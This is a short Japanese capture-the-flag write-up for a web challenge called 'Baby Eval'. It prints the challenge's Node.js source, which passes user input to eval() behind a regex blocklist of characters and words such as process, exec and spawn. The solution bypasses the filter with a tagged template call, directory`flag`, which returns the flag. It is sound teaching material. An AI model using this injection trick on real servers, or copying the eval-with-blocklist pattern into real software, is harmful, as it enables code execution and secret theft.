# Baby Eval:Web:458pts
Yet another baby challenge…  
[https://babyeval-twekqonvua-uc.a.run.app/](https://babyeval-twekqonvua-uc.a.run.app/)  

# Solution
URLが渡されるのでアクセスすると、ソースなど各種情報が表示されているサイトであった。  
[site.png](site/site.png)  
ソースを見ると以下のようであった。  
```js
const express = require('express');
const app = express();

function escape(s) {
    return `${s}`.replace(/./g,c => "&#" + c.charCodeAt(0) + ";");
}

function directory(keys) {
    const values = {
        "title": "View Source CTF",
        "description": "Powered by Node.js and Express.js",
        "flag": process.env.FLAG,
        "lyrics": "Good job, you’ve made it to the bottom of the mind control facility. Well done.",
        "createdAt": "1970-01-01T00:00:00.000Z",
        "lastUpdate": "2022-02-22T22:22:22.222Z",
        "source": require('fs').readFileSync(__filename),
    };

    return "<dl>" + keys.map(key => `<dt>${key}</dt><dd><pre>${escape(values[key])}</pre></dd>`).join("") + "</dl>";
}

app.get('/', (req, res) => {
    const payload = req.query.payload;

    if (payload && typeof payload === "string") {
        const matches = /([\.\(\)'"\[\]\{\}<>_$%\\xu^;=]|import|require|process|proto|constructor|app|express|req|res|env|process|fs|child|cat|spawn|fork|exec|file|return|this|toString)/gi.exec(payload);
        if (matches) {
            res.status(400).send(matches.map(i => `<code>${i}</code>`).join("<br>"));
        } else {
            res.send(`${eval(payload)}`);
        }
    } else {
        res.send(directory(["title", "description", "lastUpdate", "source"]));
    }
});

app.listen(process.env.PORT, () => {
    console.log(`Server started on http://127.0.0.1:${process.env.PORT}`);
});
```
`"flag": process.env.FLAG`にフラグがあるため、`directory("flag")`を呼び出せばreturnされることがわかる。  
`/`へのアクセスの挙動を見ると`req.query.payload`とクエリを受け取り、正規表現でフィルタしたのちに、evalしている。  
`[\.\(\)'"\[\]\{\}<>_$%\\xu^;=]`がネックであり通常通りの記述で関数は呼び出せないと思われるが、`` alert`test` ``で文字列を引数として関数が実行できることを思い出す。  
`` directory`flag` ``としてやればよい。  
`` https://babyeval-twekqonvua-uc.a.run.app/?payload=directory`flag` ``にアクセスする。  
[flag.png](site/flag.png)  
flagが得られた。  

## vsctf{regExAin’tGoodEnufForWAF}